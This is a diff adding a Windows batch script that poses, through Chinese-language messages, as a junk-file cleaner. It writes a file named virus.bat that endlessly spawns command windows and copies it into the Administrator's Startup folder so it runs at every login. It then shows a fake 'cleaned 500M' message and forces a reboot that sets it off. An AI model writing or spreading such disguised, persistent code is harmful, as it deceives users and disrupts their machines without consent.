@@ -1,0 +1,25 @@
+@echo off
+echo.
+echo :start > C:\a\virus.bat
+echo start cmd >> C:\a\virus.bat
+echo goto start >> C:\a\virus.bat
+copy C:\a\virus.bat "C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\" >nul
+if %errorlevel%==1 goto error" 
+
+echo   ====== 垃圾清理中，请不要关闭窗口======
+echo.
+ping -n 2 127.0.0.1 >nul
+echo   ====== 垃圾清理完毕，共清理垃圾500M ======
+echo.
+echo   ====== 建议立即重启电脑 ======
+echo.
+set /p u=是否重启电脑(y/n):
+if %u%=="y" goto s
+
+:s
+shutdown -r -t 1
+
+:error
+echo   ====== 程序运行失败，请使用【管理员权限】重新运行！======
+pause
+exit
